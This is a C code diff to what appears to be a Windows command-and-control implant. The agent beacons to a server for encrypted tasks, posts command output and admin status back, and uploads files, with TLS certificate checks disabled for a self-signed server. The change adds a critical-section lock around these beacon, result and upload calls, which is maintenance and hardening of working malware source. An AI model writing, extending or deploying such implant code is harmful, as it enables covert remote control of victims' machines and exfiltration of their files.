@@ -12,6 +12,16 @@
 
 AgentState g_agent = {0};
 
+static CRITICAL_SECTION g_transport_lock;
+static LONG g_transport_lock_init = 0;
+
+static void transport_lock(void) {
+    if (InterlockedCompareExchange(&g_transport_lock_init, 1, 0) == 0)
+        InitializeCriticalSection(&g_transport_lock);
+    EnterCriticalSection(&g_transport_lock);
+}
+static void transport_unlock(void) { LeaveCriticalSection(&g_transport_lock); }
+
 // TLS ignore flags (self-signed server cert)
 #define SEC_IGNORE_FLAGS \
     (SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
@@ -287,8 +297,10 @@ AgentTask* agent_beacon(int *count) {
     snprintf(path, sizeof(path), "/beacon/%s", g_agent.agent_id);
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
-    if (!http_do("GET", path, NULL, 0, &resp, &resp_len, &status) ||
-        status == 204 || status != 200 || !resp)
+    transport_lock();
+    int http_ok = http_do("GET", path, NULL, 0, &resp, &resp_len, &status);
+    transport_unlock();
+    if (!http_ok || status == 204 || status != 200 || !resp)
     { free(resp); return NULL; }
 
     // Decrypt
@@ -400,7 +412,9 @@ void agent_send_result_admin(long long task_id, const char *output,
             task_id, esc_out, esc_err, is_admin ? "true" : "false");
         char path[128];
         snprintf(path, sizeof(path), "/result/%s", g_agent.agent_id);
+        transport_lock();
         send_enc(path, body);
+        transport_unlock();
         free(body);
     }
     free(esc_out); free(esc_err);
@@ -420,7 +434,9 @@ void agent_upload_file(long long task_id, const char *filename,
     char path[256];
     snprintf(path, sizeof(path), "/upload/%s/%s", g_agent.agent_id, filename);
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
+    transport_lock();
     http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
+    transport_unlock();
     free(resp); free(enc);
 }
 
